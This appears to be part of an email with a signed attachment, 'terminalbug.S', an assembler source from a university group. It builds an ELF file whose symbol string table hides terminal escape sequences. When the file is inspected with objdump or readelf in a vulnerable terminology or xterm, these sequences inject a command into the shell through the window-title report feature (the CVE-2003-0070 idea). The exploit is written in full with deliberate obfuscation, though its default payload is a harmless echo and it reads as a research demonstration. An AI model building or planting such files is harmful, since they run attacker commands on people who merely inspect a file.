=1B[0;5;37;47m    .   .    .          ;=1B[0;5;35;40m:=1B[0;1;31;41m@=1B[0;=
5;31;40mX=1B[0;1;30;41m8=1B[0;1;30;47m8=1B[0;5;37;47m.      .  .. .8=1B[0;3=
3;41m8=1B[0;5;31;41m8=1B[0;5;35;40mS=1B[0;5;31;41mS=1B[0;5;35;40m;=1B[0;5;3=
1;41m@=1B[0;5;35;40m:=1B[0;1;30;47m8=1B[0;1;37;47m.=1B[0;5;37;47mX.. ..=1B[=
0m=0D
=1B[0;5;37;47m  .   .   .    . . .  . :=1B[0;1;30;47m8=1B[0;35;41mS=1B[0;33=
;41m@=1B[0;35;41m8=1B[0;1;37;47m =1B[0;5;37;47m.. . .   .. .. =1B[0;1;37;47=
m:=1B[0;31;45m8=1B[0;1;31;41m8=1B[0;5;35;40m%=1B[0;5;31;41mS=1B[0;5;35;40mt=
=1B[0;5;31;41m%=1B[0;5;37;47m8. .  . =1B[0m=0D
=1B[0;5;37;47m        .   .        . .;=1B[0;1;30;45m8=1B[0;31;43m8=1B[0;1;=
30;45m8=1B[0;1;31;41m8=1B[0;5;37;47m8: . .   .     .  =1B[0;1;37;47m@ =1B[0=
;1;30;47m8=1B[0;5;35;41m%=1B[0;1;37;47m%=1B[0;5;37;47m%    .  =1B[0m=0D
=1B[0;5;37;47m  .  .    .   .  .     . =1B[0;1;30;47m8=1B[0;5;31;41mX=1B[0;=
5;33;40m%=1B[0;35;41m8=1B[0;1;37;47m@=1B[0;5;37;47m . .  .    .   ..:t   . =
.     =1B[0m=0D
=1B[0;5;37;47m       .    .      .   ..=1B[0;1;37;47m%=1B[0;31;45m8=1B[0;5;=
33;41m8=1B[0;5;35;40mt=1B[0;1;37;47m;=1B[0;5;37;47m   ..    .   . ..  .    =
 .  . =1B[0m=0D
=1B[0;5;37;47m  .  .    .    .    .  . @=1B[0;33;41m8=1B[0;1;30;45m8=1B[0;5=
;31;41m8=1B[0;1;37;47mS=1B[0;5;37;47m  .  .     .   :... ...    .  =1B[0m=0D
=1B[0;5;37;47m   .    .    .   .     ..%=1B[0;1;30;45m8=1B[0;1;31;43m8=1B[0=
;5;35;40m;=1B[0;1;37;47m =1B[0;5;37;47m.  .  ....    .  .     ..     =1B[0m=
=0D
=1B[0;5;37;47m      .    .      .  . .  %=1B[0;5;35;40m.=1B[0;5;31;41mX=1B[=
0;5;37;47m@ .  . . . .       . .    . . .=1B[0m=0D
=1B[0;5;37;47m .  .    .    . ..    . ... .            . . .      . .    :=
=1B[0m=0D

--hdilzpeu6srm22ad
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="terminalbug.S"

	// Copyright (c) 2015, Graz University of Technology
	// Authors: Johannes Winter <johannes.winter@iaik.tugraz.at>,
	//          Nicolas Braud-Santoni <nicolas.braud-santoni@iaik.tugraz.at>
	//
	// handcrafted.S - Handcrafted ELF file (using the macro assembler)
	//
	// Compile as:
	//  clang -nostartfiles -fno-integrated-as -o terminalbug.obj \
	//    -DTERMINOLOGY -DXTERM -Ttext=0x0C0DD000 -x assembler-with-cpp terminalbug.S
	//  objcopy -Obinary -j.exploit terminalbug.obj terminalbug.elf
	//
	// Display with:
	//  objdump -t terminalbug.elf
	//
	// Tested with:
	//   $ terminology --version
	//   Version: 0.7.0
	//
	//   $ xterm -help
	//   XTerm(312) ...
	//

	//----------------------------------------------------------------------
	// Definitions taken from elf.h
	//
	// (only a small subset has been copied, see /usr/include/elf.h for the
	//  remainder)
	//

#define EI_MAG0		0		/* File identification byte 0 index */
#define ELFMAG0		0x7f		/* Magic number byte 0 */

#define EI_MAG1		1		/* File identification byte 1 index */
#define ELFMAG1		'E'		/* Magic number byte 1 */

#define EI_MAG2		2		/* File identification byte 2 index */
#define ELFMAG2		'L'		/* Magic number byte 2 */

#define EI_MAG3		3		/* File identification byte 3 index */
#define ELFMAG3		'F'		/* Magic number byte 3 */

#define EI_CLASS	4		/* File class byte index */
#define ELFCLASS32	1		/* 32-bit objects */

#define EI_DATA		5		/* Data encoding byte index */
#define ELFDATA2LSB	1		/* 2's complement, little endian */

#define EI_VERSION	6		/* File version byte index */
					/* Value must be EV_CURRENT */

#define EI_OSABI	7		/* OS ABI identification */
#define ELFOSABI_GNU	3		/* Object uses GNU ELF extensions.  */
#define ELFOSABI_LINUX	ELFOSABI_GNU	/* Compatibility alias.  */

#define EI_ABIVERSION	8		/* ABI version */

#define EI_PAD		9		/* Byte index of padding bytes */

/* Legal values for e_type (object file type).  */
#define ET_NONE		0		/* No file type */
#define ET_EXEC		2		/* Executable file */
#define ET_CORE		4		/* Core file */

/* Legal values for e_machine (architecture).  */

#define EM_NONE		 0		/* No machine */
#define EM_386		 3		/* Intel 80386 */

/* Legal values for e_version (version).  */
#define EV_CURRENT	1		/* Current version */

	/* Legal values for p_type (segment type).  */
#define	PT_NULL		0		/* Program header table entry unused */
#define PT_LOAD		1		/* Loadable program segment */
#define PT_DYNAMIC	2		/* Dynamic linking information */
#define PT_INTERP	3		/* Program interpreter */
#define PT_NOTE		4		/* Auxiliary information */
#define PT_SHLIB	5		/* Reserved */
#define PT_PHDR		6		/* Entry for header table itself */

/* Legal values for p_flags (segment flags).  */
#define PF_X		(1 << 0)	/* Segment is executable */
#define PF_W		(1 << 1)	/* Segment is writable */
#define PF_R		(1 << 2)	/* Segment is readable */

	/* Special section indices.  */

#define SHN_UNDEF	0		/* Undefined section */
#define SHN_ABS		0xfff1		/* Associated symbol is absolute */

/* Legal values for sh_type (section type).  */

#define SHT_NULL	  0		/* Section header table entry unused */
#define SHT_PROGBITS	  1		/* Program data */
#define SHT_SYMTAB	  2		/* Symbol table */
#define SHT_STRTAB	  3		/* String table */

/* Legal values for sh_flags (section flags).  */

#define SHF_WRITE	     (1 << 0)	/* Writable */
#define SHF_ALLOC	     (1 << 1)	/* Occupies memory during execution */
#define SHF_EXECINSTR	     (1 << 2)	/* Executable */
#define SHF_MERGE	     (1 << 4)	/* Might be merged */
#define SHF_STRINGS	     (1 << 5)	/* Contains nul-terminated strings */
#define SHF_INFO_LINK	     (1 << 6)	/* `sh_info' contains SHT index */
#define SHF_LINK_ORDER	     (1 << 7)	/* Preserve order after combining */
#define SHF_OS_NONCONFORMING (1 << 8)	/* Non-standard OS specific handling
					   required */
#define SHF_GROUP	     (1 << 9)	/* Section is member of a group.  */
#define SHF_TLS		     (1 << 10)	/* Section hold thread-local data.  */
#define SHF_MASKOS	     0x0ff00000	/* OS-specific.  */
#define SHF_MASKPROC	     0xf0000000	/* Processor-specific */
#define SHF_ORDERED	     (1 << 30)	/* Special ordering requirement
					   (Solaris).  */

	/* Legal values for ST_BIND subfield of st_info (symbol binding).  */

#define STB_LOCAL	0		/* Local symbol */
#define STB_GLOBAL	1		/* Global symbol */
#define STB_WEAK	2		/* Weak symbol */
#define	STB_NUM		3		/* Number of defined types.  */
#define STB_LOOS	10		/* Start of OS-specific */
#define STB_GNU_UNIQUE	10		/* Unique symbol.  */
#define STB_HIOS	12		/* End of OS-specific */
#define STB_LOPROC	13		/* Start of processor-specific */
#define STB_HIPROC	15		/* End of processor-specific */

/* Legal values for ST_TYPE subfield of st_info (symbol type).  */

#define STT_NOTYPE	0		/* Symbol type is unspecified */
#define STT_OBJECT	1		/* Symbol is a data object */
#define STT_FUNC	2		/* Symbol is a code object */
#define STT_SECTION	3		/* Symbol associated with a section */
#define STT_FILE	4		/* Symbol's name is file name */
#define STT_COMMON	5		/* Symbol is a common data object */
#define STT_TLS		6		/* Symbol is thread-local data object*/
#define	STT_NUM		7		/* Number of defined types.  */
#define STT_LOOS	10		/* Start of OS-specific */
#define STT_GNU_IFUNC	10		/* Symbol is indirect code object */
#define STT_HIOS	12		/* End of OS-specific */
#define STT_LOPROC	13		/* Start of processor-specific */
#define STT_HIPROC	15		/* End of processor-specific */


/* Symbol table indices are found in the hash buckets and chain table
   of a symbol hash table section.  This special index value indicates
   the end of a chain, meaning no further symbols are found in that bucket.  */

#define STN_UNDEF	0		/* End of a chain.  */


/* How to extract and insert information held in the st_other field.  */

#define ELF32_ST_VISIBILITY(o)	((o) & 0x03)

/* For ELF64 the definitions are the same.  */
#define ELF64_ST_VISIBILITY(o)	ELF32_ST_VISIBILITY (o)

/* Symbol visibility specification encoded in the st_other field.  */
#define STV_DEFAULT	0		/* Default symbol visibility rules */
#define STV_INTERNAL	1		/* Processor specific hidden class */
#define STV_HIDDEN	2		/* Sym unavailable in other modules */
#define STV_PROTECTED	3		/* Not preemptible, not exported */

	//----------------------------------------------------------------------
	// Local helper definitions
	//
#define ELF_PHENTSIZE  32 // Size of an Elf32_Phdr
#define ELF_SHENTSIZE  40 // Size of an Elf32_Shdr
#define ELF_SYMENTSIZE 16 // Size of an Elf32_Sym

#define SHDR_LABEL(name) shdr_section_##name:
#define SHDR_IDX(name)   ((shdr_section_##name - shdrs_start) / ELF_SHENTSIZE)

	//----------------------------------------------------------------------
	// Generates an ELF executable header (Elf32_Ehdr)
	//
	.macro ELF32_EHDR type,entry=0,phdrs=0,phdrs_count=0,shdrs=0,shdrs_count=0,shstrndx=0,machine=EM_386
	// ELF File Header (Elf32_Ehdr)
1:
	// unsigned char e_ident[EI_NIDENT];
	.byte ELFMAG0			 // unsigned char e_ident[EI_MAG0]
	.byte ELFMAG1			 // unsigned char e_ident[EI_MAG1]
	.byte ELFMAG2			 // unsigned char e_ident[EI_MAG2]
	.byte ELFMAG3			 // unsigned char e_ident[EI_MAG3]
	.byte ELFCLASS32		 // unsigned char e_ident[EI_CLASS]
	.byte ELFDATA2LSB		 // unsigned char e_ident[EI_DATA]
	.byte EV_CURRENT		 // unsigned char e_ident[EI_VERSION]
	.byte ELFOSABI_LINUX		 // unsigned char e_ident[EI_OSABI]
	.byte 0				 // unsigned char e_ident[EI_VERSION]
	.byte 0, 0, 0, 0, 0, 0, 0        // unsigned char e_ident[EI_APD..EI_NIDENT-1] (padding)

	.short \type			 // Elf32_Half e_type
	.short \machine			 // Elf32_Half e_machine
	.long  EV_CURRENT		 // Elf32_Half e_version
	.long  \entry			 // Elf32_Addr e_entry
	.if (\phdrs != 0)                // Elf32_Off  e_phoff
	 .long  (\phdrs - 1b)
	.else
	 .long  0
	.endif
	.if (\shdrs != 0)                // Elf32_Off  e_shoff
	  .long  (shdrs_start - 1b)
	.else
	  .long 0
	.endif
	.long  0x00000000                // Elf32_Word e_flags
	.short (2f - 1b)                 // Elf32_Half e_ehsize
	.short ELF_PHENTSIZE             // Elf32_Half e_phentsize
	.short \phdrs_count              // Elf32_Half e_phnum
	.short ELF_SHENTSIZE             // Elf32_Half e_shentsize
	.short \shdrs_count              // Elf32_Half e_shnum
	.short \shstrndx                 // Elf32_half e_shstrndx
2:
	.endm

	//----------------------------------------------------------------------
	// Generates an ELF program header (Elf32_Phdr)
	//
	.macro ELF32_PHDR_EX type,offset,vaddr,paddr,filesz,memsz,flags,align
	.long \type   // Elf32_Word p_type;
	.long \offset // Elf32_Off  p_offset;
	.long \vaddr  // Elf32_Addr p_vaddr;
	.long \paddr  // Elf32_Addr p_paddr;
	.long \filesz // Elf32_Word p_filesz;
	.long \memsz  // Elf32_Word p_memsz;
	.long \flags  // Elf32_Word p_flags;
	.long \align  // Elf32_Word p_align;
	.endm

	.macro ELF32_PHDR type,start,size,flags,align=0x1
	ELF32_PHDR_EX \type, (\start - elf_start), \start, \start, \size, \size, \flags, \align
	.endm

	//----------------------------------------------------------------------
	// Generates an ELF section header (Elf32_Shdr)
	//
	.macro ELF32_SHDR_EX name,type,flags,addr,offset,size,link,info,addralign,entsize
	.long \name      // Elf32_Word sh_name;
	.long \type      // Elf32_Word sh_type;
	.long \flags     // Elf32_Word sh_flags;
	.long \addr      // Elf32_Addr sh_addr;
	.long \offset    // Elf32_Off  sh_offset;
	.long \size      // Elf32_Word sh_size;
	.long \link      // Elf32_Word sh_link;
	.long \info      // Elf32_Word sh_info;
	.long \addralign // Elf32_Word sh_addralign;
	.long \entsize   // Elf32_Word sh_entsize;
	.endm

	.macro ELF32_SHDR_NULL name
	ELF32_SHDR_EX \name, SHT_NULL, 0, 0, 0, 0, 0, 0, 0, 0
	.endm

	.macro ELF32_SHDR_PROGBITS name,flags,start,end,align=0
	ELF32_SHDR_EX \name,SHT_PROGBITS,\flags,\start,(\start-elf_start),(\end-\start),0,0,\align,0
	.endm

	.macro ELF32_SHDR_SYMTAB name,start,end,strtab
	ELF32_SHDR_EX \name,SHT_SYMTAB,0,\start,(\start-elf_start),(\end-\start),\strtab,0,0,ELF_SYMENTSIZE
	.endm


	.macro ELF32_SHDR_STRTAB name,start,end
	ELF32_SHDR_EX \name,SHT_STRTAB,0,\start,(\start-elf_start),(\end-\start),0,0,1,0
	.endm

	//----------------------------------------------------------------------
	// Generates an ELF symbol table entry (Elf32_Sym)
	//
	.macro ELF32_SYM_EX name,value,size,info,other,shndx
	.long \name
	.long \value
	.long \size
	.byte \info
	.byte \other
	.short \shndx
	.endm

	.macro ELF32_SYM name,binding,type,value,size,shndx
	ELF32_SYM_EX \name, \value, \size, (((\binding) << 4) | (\type)), 0, \shndx
	.endm

	//----------------------------------------------------------------------
	// Example ELF image
	//
	.section ".exploit", "awx", "progbits"
	.align 0x1000, 0x00	// Force initial alignment to page boundary (4K)

	// ELF file header
	//
elf_start:
	ELF32_EHDR ET_EXEC, _start, phdrs_start, phdrs_count, shdrs_start, shdrs_count, SHDR_IDX(shstrtab)

	// ELF program header table
	//
phdrs_start:
	ELF32_PHDR PT_PHDR, phdrs_start, (phdrs_end - phdrs_start), (PF_R | PF_X), 0x4
	ELF32_PHDR PT_LOAD, elf_start,   (seg0_end - elf_start),    (PF_R | PF_X), 0x1000
phdrs_end:
	.set phdrs_count, (phdrs_end - phdrs_start) / ELF_PHENTSIZE

	//----------------------------------------------------------------------
	// .text segment
	//
_text:
	.align 4, 0x00
#define SYS_NR_EXIT   1
#define SYS_NR_WRITE  4
#define STDOUT_FILENO 1

	// Syscall via traditional int 0x80 interface
	.macro do_syscall nr
	MOV $\nr, %eax
	INT $0x80

	// For VDSO we would link the image without -static and use:
	// CALL *%gs:0x10
	.endm

	.global _start
_start:
	// Say hello
	MOV $STDOUT_FILENO, %ebx
	MOV $hello_start, %ecx
	MOV $(hello_end - hello_start), %edx
	do_syscall SYS_NR_WRITE

	// And leave via SYS_EXIT
	MOV $0x00000000, %ebx
	do_syscall SYS_NR_EXIT
_end:

_etext:

	//----------------------------------------------------------------------
	// .rodata segment
	//
_rodata:
hello_start:
	.ascii "Hello tiny world!\n"
hello_end:
	.align 4, 0x00
_erodata:

	// End of loader segment 0 (headers + .text segment + .rodata segment)
seg0_end:

	//----------------------------------------------------------------------
	// ELF section header string table (.shstrtab)
	//
strtab_start:
shstrtab_start:
shstr_empty:	.byte 0x00
shstr_text:	.asciz ".text"
shstr_rodata:	.asciz ".rodata"
shstr_shstrtab:	.asciz ".shstrtab"
shstr_symtab:	.asciz ".symtab"
shstr_strtab:	.asciz ".strtab"
		.byte 0x00
		.align 4, 0x00
shstrtab_end:

	//----------------------------------------------------------------------
	// ELF string table (.strtab)
	//

str_empty:	.byte 0x00
str__start:	.asciz "_start"
str_hello_start:.asciz "hello_start"
str_hello_end:	.asciz "hello_end"
str_srcfile:
	// Fool users of "readelf -a" :)
	.ascii "/home/sase/terminal_bug.o"

	// Here comes the surprise
	.byte  '\n'
	.incbin "marvin.txt"
	.byte  0x1B, '[', '4', '1', 'm'
	.rept 15
	.byte 0x20, 0x20, 0xE2, 0x98, 0xA2, 0x20 // Space, Radiation warning
	.endr
	.byte  0x1B, '[', 'm', '\n'
	.byte  0x1B, '[', '4', '1', 'm'

	// Stealthy version of:
	//  .ascii "Marvin thinks that terminal control codes are dangerous!    "
	.irp c,'M','a','r','v','i','n',' ','t','h','i','n','k','s',' ','t','h','a','t',' ','t','e','r','m','i','n','a','l',' ','c','o','n','t','r','o','l',' ','c','o','d','e','s',' ','a','r','e',' ','d','a','n','g','e','r','o','u','s','!',' ',' ',' '
	.byte \c, 0x20, 0x08
	.endr

	.byte  0x1B, '[', 'm', '\n'
	.byte  0x1B, '[', '4', '1', 'm'

	// Stealthy version of:
	// .ascii "Have a look at CVE-2003-0070 for more details on the idea   "
	.irp c,'H','a','v','e',' ','a',' ','l','o','o','k',' ','a','t',' ','C','V','E','-','2','0','0','3','-','0','0','7','0',' ','f','o','r',' ','m','o','r','e',' ','d','e','t','a','i','l','s',' ','o','n',' ','t','h','e',' ','i','d','e','a',' ',' '
	.byte \c, 0x20, 0x08
	.endr

	.byte  0x1B, '[', 'm', '\n'
	.byte  0x1B, '[', '4', '1', 'm'


	// Stealthy version of:
	// .ascii "behind this example! (for best results, try this demo with  "
	.irp c,'b','e','h','i','n','d',' ','t','h','i','s',' ','e','x','a','m','p','l','e','!',' ','(','f','o','r',' ','b','e','s','t',' ','r','e','s','u','l','t','s',',',' ','t','r','y',' ','t','h','i','s',' ','d','e','m','o',' ','w','i','t','h',' '
	.byte \c, 0x20, 0x08
	.endr

	.byte  0x1B, '[', 'm', '\n'
	.byte  0x1B, '[', '4', '1', 'm'

	// Stealthy version of:
	// .ascii "xterm and enable \"Allow Window ops\")                        "
	.irp c,'x','t','e','r','m',' ','a','n','d',' ','e','n','a','b','l','e',' ','\"','A','l','l','o','w',' ','W','i','n','d','o','w',' ','o','p','s','\"',')',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' '
	.byte \c, 0x20, 0x08
	.endr

	.byte  0x1B, '[', 'm', '\n'

	// For the bugs!
	// printf "\e]2;echo foo\n\a\e]2;?\a"

#ifndef PAYLOAD
#define PAYLOAD "echo you really should not feed them "
#endif

#if !defined(TERMINOLOGY) && !defined(XTERM)
#warning "* neither TERMINOLOGY nor XTERM are defined"
#endif

	// Version compatible with terminology
#ifdef TERMINOLOGY
	.ascii "trying to bug terminology\n"

	// Set the window title
	.byte 0x1B, ']', '2', ';'
	.ascii PAYLOAD
	.byte '\n', 0x07

	// Get window title
	.byte 0x1B, ']', '2', ';', '?', 0x07
#endif

	// Version compatible with xterm
	// It does not allow us to send the '\n' directly :(
#ifdef XTERM
	.ascii "now trying to bug xterm\n"
	// Set the window title
	.byte 0x1B, ']', '2', ';'
	.ascii "s -l ; "
	.ascii PAYLOAD
	.byte 0x07

	// Get the window title (Xterm version)
	.byte 0x1B, '[', '2', '1', 't'
#endif


	// Set the window title (again)
	.byte 0x1B, ']', '2', ';'
	.ascii "marvin was here!"
	.byte 0x07
	.byte 0x00
	.align 4, 0x00
strtab_end:
	.align 4, 0x00


	//----------------------------------------------------------------------
	// ELF symbol table
	//
#define STR_OFF(name) (str_##name - strtab_start)
symtab_start:
	ELF32_SYM STR_OFF(empty),       STB_LOCAL,  STT_NOTYPE,  0,           0,                          SHN_UNDEF
	ELF32_SYM STR_OFF(empty),       STB_LOCAL,  STT_SECTION, _text,       0 /*(_etext - _text)*/,     SHDR_IDX(text)
	ELF32_SYM STR_OFF(empty),       STB_LOCAL,  STT_SECTION, _rodata,     0 /*(_erodata - _rodata)*/, SHDR_IDX(rodata)
	ELF32_SYM STR_OFF(srcfile),     STB_LOCAL,  STT_FILE,    0,           0,                          SHN_ABS
	ELF32_SYM STR_OFF(_start),      STB_GLOBAL, STT_FUNC,    _start,      (_etext - _start),          SHDR_IDX(text)
	ELF32_SYM STR_OFF(hello_start), STB_LOCAL,  STT_OBJECT,  hello_start, (hello_end - hello_start),  SHDR_IDX(rodata)
	ELF32_SYM STR_OFF(hello_end),   STB_LOCAL,  STT_NOTYPE,  hello_end,   0,                          SHDR_IDX(rodata)
symtab_end:

	//----------------------------------------------------------------------
	// ELF section header table
	//
#define SHSTR_OFF(name) (shstr_##name - shstrtab_start)
shdrs_start:
	ELF32_SHDR_NULL     SHSTR_OFF(empty)
SHDR_LABEL(text)     ELF32_SHDR_PROGBITS SHSTR_OFF(text),   (SHF_ALLOC | SHF_EXECINSTR), _text, _etext, 4
SHDR_LABEL(rodata)   ELF32_SHDR_PROGBITS SHSTR_OFF(rodata), (SHF_ALLOC), _rodata, _erodata
SHDR_LABEL(shstrtab) ELF32_SHDR_STRTAB   SHSTR_OFF(shstrtab), shstrtab_start, shstrtab_end
SHDR_LABEL(symtab)   ELF32_SHDR_SYMTAB   SHSTR_OFF(symtab),   symtab_start, symtab_end, SHDR_IDX(strtab)
SHDR_LABEL(strtab)   ELF32_SHDR_STRTAB   SHSTR_OFF(strtab),   strtab_start, strtab_end
shdrs_end:
	.set shdrs_count, (shdrs_end - shdrs_start) / ELF_SHENTSIZE

--hdilzpeu6srm22ad--

--pkxg2odm7psetm3k
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIcBAABCgAGBQJYHNouAAoJEJ1PiAEM/hnjPQIP/3H1SLpVGxK1FOg8iJvq6Qxp
GIsCFm8Ze7X/+cH3tL+foo/sixohxbJ4yJx2ieskwmEE3vB/TDqbltuAYpForPeZ
9shtQSt55u5zX1u3SSBYWWjHCnYO5jYxx7Lke8ZCInOl2jHx6LkTr50T33YG9Ewr
u1cJiSllNGYK+qrult/YMFEP9dR7Yb+arqjLHp95bu+6W1lg8dLGDu8DLaVdPHj4
xE/1zJgf8LUPAe0ro0RkeQPMilElLbF8Bhshd5fmcdoH7sl1SAgCK6qkbGGJrrza
HTVgQOXn/1q3N6owSSG9mW1XdBY++ATQ4GWHhDtQ7zxdn2o9oY+jxbyQdB0ZDWAr
ufPGOy4d3VYQMlSCbx29TyB1zW3zLAgIieoRXvh4aECtcwT4u3iHWCCHQwjOw4nQ
z/vh6Ra2/NyGoKs9cx8OeHi6gAQcQd/QDHc49tPOX5/EJtFF+/DH+IayFyhiTGyd
U+QDyutZCSD37yWVMuNZwLuXJwj67tmzN2MpViP24IOSHLFrtXBzoa6UEgxFswAz
RyvKDtsORVggO2Q2hGvof0CU6EPJ1La7oMGZCe2E0CQYqOmSt8OvvxORx4wnLpqu
iN+U/biCC5z9mdC2JuQDACNbAapJJf10B8woFlGuqTsK9NTPo97UWKxb5gsS7fJf
ICf1wMo7Q/c3HxYM8I2O
=fYNO
-----END PGP SIGNATURE-----

--pkxg2odm7psetm3k--

